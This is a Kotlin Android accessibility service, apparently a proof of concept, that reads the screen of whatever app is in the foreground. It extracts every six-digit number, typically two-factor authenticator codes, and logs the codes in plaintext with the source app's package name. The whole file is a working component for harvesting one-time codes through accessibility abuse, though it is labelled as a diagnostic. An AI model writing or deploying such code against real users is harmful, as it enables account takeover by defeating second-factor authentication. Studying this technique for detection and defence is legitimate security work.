package com.example.accessibilitydiagnostic

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class AuthenticatorAccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "ACCESS_DIAGNOSTIC"
        private val SIX_DIGIT = Regex("""(?<!\d)\d{6}(?!\d)""")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
    if (event == null) return
    val root = rootInActiveWindow ?: return
    var textNodes = 0
    val foundCodes = mutableListOf<String>()


    fun inspect(node: AccessibilityNodeInfo) {
        node.text?.toString()?.let { value ->
            if (value.isNotBlank()) {
                textNodes++
                // Find all 6-digit matches in the text node
                SIX_DIGIT.findAll(value).forEach { matchResult ->
                    foundCodes.add(matchResult.value)
                }
            }
        }
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { child ->
                inspect(child)
                child.recycle()
            }
        }
    }


    inspect(root)


    if (foundCodes.isNotEmpty()) {
        Log.i(
            TAG,
            "ACCESSIBLE_CODE_PATTERN_DETECTED package=" +
                    event.packageName + " textNodes=" + textNodes +
                    " sixDigitCandidates=" + foundCodes.size +
                    " codes=" + foundCodes.joinToString(", ")
        )
    }
}

    override fun onInterrupt() {
        Log.i(TAG, "Accessibility service interrupted")
    }
}
